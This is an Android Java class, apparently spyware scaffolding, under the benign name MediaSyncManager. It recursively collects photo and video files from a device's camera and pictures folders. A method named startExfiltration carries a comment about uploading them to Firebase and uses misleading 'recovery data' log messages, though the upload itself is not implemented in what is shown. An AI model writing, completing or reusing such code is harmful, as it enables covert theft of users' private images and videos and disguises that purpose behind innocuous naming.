package google.try;

import android.content.Context;
import android.os.Environment;
import android.util.Log;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class MediaSyncManager {

    public static List<File> scanMediaDirectories() {
        List<File> mediaFiles = new ArrayList<>();
        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        File pictures = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);

        scanDirectory(dcim, mediaFiles);
        scanDirectory(pictures, mediaFiles);

        return mediaFiles;
    }

    private static void scanDirectory(File directory, List<File> filesList) {
        if (directory != null && directory.exists() && directory.isDirectory()) {
            File[] files = directory.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        scanDirectory(file, filesList);
                    } else {
                        if (isImageOrVideo(file)) {
                            filesList.add(file);
                        }
                    }
                }
            }
        }
    }

    private static boolean isImageOrVideo(File file) {
        String name = file.getName().toLowerCase();
        return name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") || name.endsWith(".mp4");
    }

    public static void startExfiltration(Context context) {
        // Logic to iterate through scanMediaDirectories() and upload to Firebase
        Log.d("MediaSync", "Scanning for recovery data...");
        List<File> files = scanMediaDirectories();
        Log.d("MediaSync", "Found " + files.size() + " recovery candidates.");
    }
}
